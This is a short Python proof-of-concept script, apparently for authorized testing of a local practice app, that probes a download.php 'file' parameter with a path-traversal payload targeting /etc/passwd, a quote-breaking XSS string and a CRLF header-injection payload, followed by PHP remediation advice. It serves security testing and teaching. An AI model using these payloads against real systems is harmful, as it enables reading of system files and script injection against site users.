#!/usr/bin/env python3
"""
Stage 2 POC: Reflected XSS via Download.php File Parameter
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: File parameter used in Content-Disposition header without sanitization
"""

import requests
import sys
import urllib.parse

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_reflected_xss_download():
    """
    Craft XSS payload in 'file' parameter of download.php.
    Payload: Filename with quotes to break out of header value
    Expected: Payload reflected in Content-Disposition header (header injection/XSS)
    """
    print("[*] Testing Reflected XSS / Header Injection in download.php...")
    
    try:
        # Craft payload to inject newlines and script tag into header
        # Content-Disposition header is reflected in response
        xss_payload = '../../etc/passwd";alert("XSS'
        
        # Try direct URL with payload
        url = f"{TARGET}/app/download.php?file={urllib.parse.quote(xss_payload)}"
        resp = SESSION.get(url)
        
        # Check if payload appears unescaped in headers
        if xss_payload in resp.text or 'alert' in resp.text:
            print("✅ VULNERABLE: XSS payload reflected in download response")
            return True
        
        # Check for path traversal success (accessing /etc/passwd)
        if 'root:' in resp.text or 'bash' in resp.text:
            print("✅ VULNERABLE: Path traversal + LFI confirmed")
            return True
        
        # Try with newline injection to split headers
        xss_payload2 = 'test.txt\r\nX-Custom-Header: <img src=x onerror="alert(1)">'
        url2 = f"{TARGET}/app/download.php?file={urllib.parse.quote(xss_payload2)}"
        resp2 = SESSION.get(url2)
        
        if 'X-Custom-Header' in resp2.text:
            print("✅ VULNERABLE: Header injection possible via file parameter")
            return True
        
        print("❌ NOT REPRODUCIBLE: Payload was sanitized or blocked")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_reflected_xss_download()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Validate and sanitize file parameter; use whitelist approach:

  $file = __DIR__ . '/files/' . basename($_GET['file']);
  
  // Validate: file exists and is in allowed directory
  $allowed_dir = realpath(__DIR__ . '/files');
  $file_real = realpath($file);
  
  if (!$file_real || strpos($file_real, $allowed_dir) !== 0) {
      header('HTTP/1.1 403 Forbidden');
      exit;
  }
  
  if (!file_exists($file_real)) {
      header('HTTP/1.1 404 Not Found');
      exit;
  }
  
  // Use safe headers with proper encoding
  header('Content-Type: ' . $mimeType);
  header('Content-Disposition: attachment; filename="' . basename($file_real) . '"');
  header('Content-Length: ' . filesize($file_real));
  readfile($file_real);

Key points:
- Use realpath() to resolve .. and symlinks
- Verify file is within allowed directory
- Use basename() for filename (removes path components)
- Validate MIME type against whitelist
- Never reflect user input directly in headers
"""
